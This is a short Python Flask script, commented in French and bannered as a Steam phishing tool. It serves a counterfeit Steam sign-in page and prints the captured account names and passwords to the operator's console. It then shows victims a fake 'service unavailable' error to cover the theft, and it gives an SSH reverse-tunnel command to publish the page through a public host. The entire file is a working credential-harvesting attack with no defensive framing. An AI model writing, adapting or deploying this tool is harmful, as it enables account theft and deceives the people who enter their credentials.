from flask import Flask, request, render_template_string
import os
import sys
import time

app = Flask(__name__)

# Design violet/blanc comme dans ton projet original
def print_banner():
    os.system('clear')
    banner = "ST34M PH1SH1NG TO0L - COMPATIBLE MAC INTEL"
    print("\033[95m" + "="*50)
    print(banner.center(50))
    print("="*50 + "\033[0m")

# Page HTML simplifiée pour Steam
HTML_PAGE = '''
<!DOCTYPE html>
<html style="background-color: #1b2838; color: #c7d5e0; font-family: Arial;">
<head><title>Sign In</title></head>
<body>
    <div style="width: 350px; margin: 80px auto; background: #171a21; padding: 40px; border: 1px solid #000;">
        <h2 style="color: #66c0f4;">SIGN IN</h2>
        <form method="POST">
            <p>Steam Account Name</p>
            <input type="text" name="username" style="width:100%; background:#32353c; color:white; border:none; padding:10px;">
            <p>Password</p>
            <input type="password" name="password" style="width:100%; background:#32353c; color:white; border:none; padding:10px;">
            <br><br>
            <button type="submit" style="width:100%; padding:10px; background:linear-gradient(to right, #47bfff, #1a44c2); color:white; border:none; cursor:pointer;">Sign In</button>
        </form>
    </div>
</body>
</html>
'''

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        user = request.form.get('username')
        pw = request.form.get('password')
        print(f"\n\033[91m[+] DONNÉES CAPTURÉES :\033[0m")
        print(f" > Nom de compte : {user}")
        print(f" > Mot de passe : {pw}")
        return "<h1>Error 500</h1><p>Steam Service Temporarily Unavailable.</p>"
    return render_template_string(HTML_PAGE)

if __name__ == '__main__':
    print_banner()
    print("\033[94m[1]\033[0m Ton serveur local est prêt : http://127.0.0.1:5000")
    print("\033[94m[2]\033[0m Pour créer le lien public (Pinggy) :")
    print("    Ouvre un NOUVEAU terminal et colle cette commande :")
    print("\033[92m    ssh -R 80:localhost:5000 a.pinggy.io\033[0m")
    print("-" * 50)
    
    # On lance Flask sur le port 5000
    app.run(port=5000)
